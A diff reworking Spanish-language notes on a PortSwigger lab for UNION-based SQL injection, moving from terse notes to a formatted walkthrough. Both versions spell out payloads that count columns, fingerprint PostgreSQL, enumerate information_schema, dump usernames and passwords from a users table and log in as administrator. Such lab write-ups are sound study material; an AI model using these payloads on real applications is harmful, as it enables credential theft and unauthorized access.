@@ -1,25 +1,106 @@
-[SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+# SQL Injection UNION Attack - Retrieving Data From Other Tables
 
-Identificacion de columnas en BD: `' order by 2 -- -`
-![[Pasted image 20260403204953.png]]
+## 📌 Lab Information
 
-Verificación de contenido en columnas: `'union select 'a','s' -- -`
-![[Pasted image 20260403205119.png]]
+- **Lab:** Retrieving Data From Other Tables
+- **Categoría:** UNION SQL Injection
 
-Como pasa sin necesidad de un 'from dual' quiere decir que no es oracle, por lo que acotamos ver la version de la BD, probamos con `@@version` para descartar que sea MySQL o Microsoft, pero nos muestra error internal server, por lo que solo quedaria probar con PostgreSQL `version()`
-![[Pasted image 20260403205344.png]]
+🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
 
-el enunciado de laboratorio nos dice que tenemos que extraer los datos usuario y password de otra tabla, por lo que primero listaremos las tablas:
-![[Pasted image 20260403205509.png]]
+---
 
-Localizamos la tabla `users`
-![[Pasted image 20260403205615.png]]
+## 🎯 Objetivo
 
-Listamos su contenido (columnas): ' union select column_name,null from information_schema.columns where table_name='users' -- -
-![[Pasted image 20260403205757.png]]
+Extraer usuarios y contraseñas desde otra tabla de la base de datos.
 
-Ahora que tenemos identificadas las columnas, listaremos el contenido de la columna 'username' y 'password': `'union select username,password from users -- -`
-![[Pasted image 20260403205933.png]]
+---
 
-Y por ultimo iniciamos sesion con las credenciales del usuario administrador.
-![[Pasted image 20260403210026.png]]
+## 🔍 Enumeración de columnas
+
+```sql
+' order by 2 -- -
+```
+
+![Enumeración columnas](Imagenes/pasted-image-20260403204953.png)
+
+---
+
+## 🔍 Validación de columnas visibles
+
+```sql
+' union select 'a','b' -- -
+```
+
+![Validación columnas](Imagenes/pasted-image-20260403205119.png)
+
+---
+
+## 🔍 Identificación del motor
+
+Probamos MySQL/Microsoft:
+
+```sql
+@@version
+```
+
+Error.
+
+Probamos PostgreSQL:
+
+```sql
+version()
+```
+
+![Versión PostgreSQL](Imagenes/pasted-image-20260403205344.png)
+
+---
+
+## 🚀 Listado de tablas
+
+```sql
+' union select table_name,null from information_schema.tables -- -
+```
+
+![Listado tablas](Imagenes/pasted-image-20260403205509.png)
+
+---
+
+## 🔍 Tabla users
+
+![Tabla users](Imagenes/pasted-image-20260403205615.png)
+
+---
+
+## 🚀 Listado de columnas
+
+```sql
+' union select column_name,null from information_schema.columns where table_name='users' -- -
+```
+
+![Columnas users](Imagenes/pasted-image-20260403205757.png)
+
+---
+
+## 🚀 Extracción de credenciales
+
+```sql
+' union select username,password from users -- -
+```
+
+![Credenciales](Imagenes/pasted-image-20260403205933.png)
+
+---
+
+## 🔓 Acceso administrador
+
+![Login administrador](Imagenes/pasted-image-20260403210026.png)
+
+---
+
+## ✅ Resultado
+
+Se logró:
+- Enumerar tablas
+- Enumerar columnas
+- Extraer credenciales
+- Acceder como administrador
